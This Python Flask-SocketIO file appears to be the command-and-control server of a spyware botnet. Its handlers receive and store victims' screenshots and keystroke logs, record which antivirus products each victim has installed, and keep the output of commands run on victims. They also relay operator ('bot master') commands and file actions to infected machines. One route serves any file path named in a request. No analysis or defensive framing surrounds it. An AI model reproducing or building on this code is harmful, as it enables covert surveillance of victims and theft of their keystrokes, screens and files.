from flask import Flask, request
from flask_socketio import SocketIO, send, join_room, leave_room, rooms, disconnect
from time import sleep
from PIL import Image
import socketio
from datetime import datetime
import os
import csv
import logging

app = Flask(__name__)
app.config['SECRET_KEY'] = 'topsecret'
sio = SocketIO(app)

file_path = 'command.csv'


                    
logger = logging.getLogger('server')
logging.basicConfig(filename='server.log', level=logging.INFO)

# Put your code here to execute when the file is modified
'''logger.info("file modified")
action_params = get_action(file_path)

#if action_params['command'] and int(action_params['command']) and action_params['send_tag']:

logger.info(action_params)
with open('command.csv', 'r+') as csvfile:
            csvfile.seek(0)
            csvfile.truncate()
logger.info("sending action")'''
#send_action(int(action_params['command']), action_params['filename'], action_params['content'], action_params['url'], action_params['method'], action_params['headers'], action_params['payload'])
            

@sio.on('connect')
def handle_connect():
    logger.info(f"my SID is {request.sid}")
    

    


@sio.on('sc_snap')
def get_snaps(img_data):
    logger.info("recevied screenshot")
    
    img = Image.frombytes(img_data['mode'], img_data['size'], img_data['image_data'])
    
            # Get the user's "Documents" folder
    documents_folder = os.path.expanduser("Documents")

    # Create the output folder if it doesn't exist
    output_folder = os.path.join(documents_folder, "screenshots")
    if not os.path.exists(output_folder):
        os.makedirs(output_folder)

    # Get the current timestamp for the screenshot filename
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")

    # Capture the screenshot
    screenshot = img

    # Define the output file path
    output_file = os.path.join(output_folder, f"screenshot_{timestamp}.png")

    # Save the screenshot to the specified folder
    screenshot.save(output_file)

    logger.info(f"Screenshot saved to: {output_file}")
    logger.info("processed screenshot correctly")
    
@sio.on('key_recorder')
def get_keylogs(recorder):
    logger.info("keys received")
    with open('keylogs.txt', "a+") as kl:
        kl.write(recorder['data'])
    logger.info(f'processed keys succesfully')
    
@sio.on('response')
def command_output(response: dict):
    logger.info(f"response received: {response} ")
    with open('command_results.txt', 'a+') as f:
        if type(response['result']) == bytes:
            f.write(response['result'].decode())
        else:
            f.write(response['result'])
    logger.info(f"result: {response.get('result')}, id: {response.get('id')}")
    


@sio.on('antiviruses')
def get_installed_anitviruses(data):
    
    logger.info(f"installed antiv's: {data}")
    
    
@app.route('/static/downloads/<file>')
def give_info(file):
    logger.info(f"requested file {file}")
    with open(file, "r+") as f:
        data = f.read()
    logger.info(f"sending back '{data}'")
    return data

@sio.on('master_command')
def receive_n_command(cmd):
    send_comm(cmd)

@sio.on('master_action')
def receive_and_broadcast(data):
    logger.info(f"received command {data['command']} from bot master. Params are {data}")
    send_action(data['command'], data['filename'], data['content'], data['url'], data['method'], data['headers'], data['payload'])
    logger.info("action broadcasted succesfully")

def send_action(comm_num, filename, file_data, url, method, headers, payload):
    logger.info(f'Start of get_command')
    
    if int(comm_num) == 1: 
        logger.info(f'Received command number {comm_num}')
        #comm_data = input("enter file name you wish to copy: ")
        
        sio.emit('action', {'action_number': int(comm_num), 'file': filename}) 
        logger.info(f"action with command number {comm_num} sent")
    elif int(comm_num) == 2: 
        logger.info(f'Received command number {comm_num}')
        #comm_data = input("enter file name you wish to copy: ")
        
        sio.emit('action', {'action_number': int(comm_num), 'file': filename, 'file_data': file_data.encode()}) 
        logger.info(f"action with command number {comm_num} sent")
    elif int(comm_num) == 3: 
        logger.info(f'Received command number {comm_num}')
        #comm_data = input("enter file name you wish to copy: ")
        
        sio.emit('action', {'action_number': int(comm_num), 'file': filename, 'file_data': file_data.encode}) 
        logger.info(f"action with command number {comm_num} sent")
    else:
        logger.warning('action chosen is invalid in some way')
        return
    
def send_comm(info):
    info['id'] = 1
    sio.emit('command', info)
    logger.info(f'command {info} sent')



#return {'command': command, 'filename': filename, 'content': file_content, 'url': url, 'method': method, 'headers': headers, 'payload': payload, 'send_tag': send_info}

if __name__ == '__main__':
    logger.info('Server CC starting main')    
    logger.info("running server")
    sio.run(app, debug=True, log_output=True)
    
     
